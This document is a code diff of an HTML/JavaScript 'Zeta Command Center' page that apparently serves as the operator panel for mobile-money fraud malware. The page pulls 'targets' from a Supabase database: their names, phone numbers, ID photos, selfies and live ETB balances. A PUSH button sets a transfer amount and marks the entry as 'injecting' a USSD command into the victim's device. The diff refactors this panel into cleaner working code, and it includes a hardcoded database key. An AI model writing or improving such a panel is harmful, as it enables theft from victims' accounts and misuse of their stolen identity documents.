@@ -1,97 +1,178 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zeta Control Panel</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        h1 { color: #00ff41; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1e1e1e; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
-        th { background: #252525; color: #00ff41; }
-        .balance { font-weight: bold; color: #ffcc00; }
-        .btn-send { background: #00ff41; color: black; border: none; padding: 8px 12px; cursor: pointer; border-radius: 4px; font-weight: bold; }
-        .btn-send:hover { background: #00cc33; }
-        input[type="number"] { background: #333; color: white; border: 1px solid #444; padding: 8px; border-radius: 4px; width: 100px; }
-        .img-thumb { width: 50px; height: 50px; object-fit: cover; border-radius: 4px; cursor: pointer; border: 1px solid #444; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zeta Control Panel</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #121212;
+    color: #e0e0e0;
+    padding: 20px;
+  }
+  .container {
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  h1 {
+    color: #00ff41;
+    border-bottom: 2px solid #00ff41;
+    padding-bottom: 10px;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin-top: 20px;
+    background: #1e1e1e;
+    border-radius: 8px;
+    overflow: hidden;
+  }
+  th, td {
+    padding: 12px;
+    text-align: left;
+    border-bottom: 1px solid #333;
+  }
+  th {
+    background: #252525;
+    color: #00ff41;
+  }
+  .balance {
+    font-weight: bold;
+    color: #ffcc00;
+  }
+  .btn-send {
+    background: #00ff41;
+    color: black;
+    border: none;
+    padding: 8px 12px;
+    cursor: pointer;
+    border-radius: 4px;
+    font-weight: bold;
+    transition: background 0.2s ease;
+  }
+  .btn-send:hover {
+    background: #00cc33;
+  }
+  input[type="number"] {
+    background: #333;
+    color: white;
+    border: 1px solid #444;
+    padding: 6px 8px;
+    border-radius: 4px;
+    width: 100px;
+  }
+  .img-thumb {
+    width: 50px;
+    height: 50px;
+    object-fit: cover;
+    border-radius: 4px;
+    cursor: pointer;
+    border: 1px solid #444;
+    margin-right: 5px;
+  }
+  #status {
+    margin-top: 10px;
+    font-style: italic;
+    color: #00ff41;
+  }
+</style>
 </head>
 <body>
 
 <div class="container">
-    <h1>ZETA COMMAND CENTER</h1>
-    <div id="status">Connecting to Supabase...</div>
-    
-    <table id="targetTable">
-        <thead>
-            <tr>
-                <th>Name / Phone</th>
-                <th>UUID</th>
-                <th>Docs</th>
-                <th>Live Balance</th>
-                <th>Set Amount</th>
-                <th>Action</th>
-            </tr>
-        </thead>
-        <tbody>
-            </tbody>
-    </table>
+  <h1>ZETA COMMAND CENTER</h1>
+  <div id="status">Connecting to Supabase...</div>
+  
+  <table id="targetTable">
+    <thead>
+      <tr>
+        <th>Name / Phone</th>
+        <th>UUID</th>
+        <th>Docs</th>
+        <th>Live Balance</th>
+        <th>Set Amount</th>
+        <th>Action</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
 </div>
 
 <script>
+  // 1. Supabase client
   const { createClient } = supabase;
 
   const SUPABASE_URL = 'https://apdsaisgviycynayhppl.supabase.co';
-  const SUPABASE_KEY = ' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFwZHNhaXNndml5Y3luYXlocHBsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY3NTU5NjEsImV4cCI6MjA4MjMzMTk2MX0.BgCb2iJ8iywkG1pkKlc8HKdlZmNlFYQ4rZB5Kjq_dMU';
+  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFwZHNhaXNndml5Y3luYXlocHBsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY3NTU5NjEsImV4cCI6MjA4MjMzMTk2MX0.BgCb2iJ8iywkG1pkKlc8HKdlZmNlFYQ4rZB5Kjq_dMU'; // replace with your anon key
 
   const supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
-    // 2. FETCH DATA
-    async function fetchTargets() {
-        const { data, error } = await supabase.from('targets').select('*').order('created_at', { ascending: false });
-        if (error) { console.error(error); return; }
-        
-        const tbody = document.querySelector('#targetTable tbody');
-        tbody.innerHTML = '';
 
-        data.forEach(target => {
-            const row = `
-                <tr>
-                    <td><strong>${target.full_name}</strong><br><small>${target.phone_number}</small></td>
-                    <td><small>${target.id.substring(0,8)}...</small></td>
-                    <td>
-                        <img class="img-thumb" src="data:image/png;base64,${target.id_photo_base64}" title="ID Photo">
-                        <img class="img-thumb" src="data:image/png;base64,${target.selfie_base64}" title="Selfie">
-                    </td>
-                    <td class="balance">${target.current_balance} ETB</td>
-                    <td><input type="number" id="amt-${target.id}" placeholder="0.00" value="${target.target_amount}"></td>
-                    <td><button class="btn-send" onclick="updateAmount('${target.id}')">PUSH</button></td>
-                </tr>
-            `;
-            tbody.innerHTML += row;
-        });
-        document.getElementById('status').innerText = "System Online | " + data.length + " Targets Found";
+  // 2. Render row
+  function renderRow(target) {
+    const tbody = document.querySelector('#targetTable tbody');
+    const existingRow = document.querySelector(`#row-${target.id}`);
+    const rowHtml = `
+      <tr id="row-${target.id}">
+        <td><strong>${target.full_name}</strong><br><small>${target.phone_number}</small></td>
+        <td><small>${target.id.substring(0,8)}...</small></td>
+        <td>
+          ${target.id_photo_base64 ? `<img class="img-thumb" src="data:image/png;base64,${target.id_photo_base64}" title="ID Photo">` : ''}
+          ${target.selfie_base64 ? `<img class="img-thumb" src="data:image/png;base64,${target.selfie_base64}" title="Selfie">` : ''}
+        </td>
+        <td class="balance">${target.current_balance} ETB</td>
+        <td><input type="number" id="amt-${target.id}" placeholder="0.00" value="${target.target_amount}"></td>
+        <td><button class="btn-send" onclick="updateAmount('${target.id}')">PUSH</button></td>
+      </tr>
+    `;
+    if (existingRow) {
+      existingRow.outerHTML = rowHtml; // update row
+    } else {
+      tbody.innerHTML += rowHtml; // add new row
+    }
+  }
+
+  // 3. Fetch all targets
+  async function fetchTargets() {
+    const { data, error } = await supabaseClient
+      .from('targets')
+      .select('*')
+      .order('created_at', { ascending: false });
+
+    if (error) {
+      console.error(error);
+      document.getElementById('status').innerText = 'Error: ' + error.message;
+      return;
     }
 
-    // 3. UPDATE AMOUNT (Remote Command)
-    async function updateAmount(id) {
-        const amount = document.getElementById(`amt-${id}`).value;
-        const { error } = await supabase.from('targets').update({ target_amount: amount, ussd_status: 'injecting' }).eq('id', id);
-        
-        if (error) alert("Error sending command");
-        else alert("Command Pushed to Device: " + amount + " ETB");
-    }
+    document.querySelector('#targetTable tbody').innerHTML = '';
+    data.forEach(renderRow);
+    document.getElementById('status').innerText = `System Online | ${data.length} Targets Found`;
+  }
 
-    // Initial Load & Realtime Subscription
-    fetchTargets();
-    supabase.channel('custom-all-channel')
-    .on('postgres_changes', { event: '*', schema: 'public', table: 'targets' }, (payload) => {
-        fetchTargets(); // Refresh table when data changes
+  // 4. Update target amount
+  async function updateAmount(id) {
+    const amount = document.getElementById(`amt-${id}`).value;
+    const { error } = await supabaseClient
+      .from('targets')
+      .update({ target_amount: amount, ussd_status: 'injecting' })
+      .eq('id', id);
+
+    if (error) alert("Error sending command: " + error.message);
+    else alert(`Command Pushed to Device: ${amount} ETB`);
+  }
+
+  // 5. Initial fetch
+  fetchTargets();
+
+  // 6. Realtime subscription (updates only changed row)
+  supabaseClient.channel('custom-all-channel')
+    .on('postgres_changes', { event: '*', schema: 'public', table: 'targets' }, payload => {
+      if (payload.new) renderRow(payload.new);
     })
     .subscribe();
-
 </script>
+
 </body>
 </html>
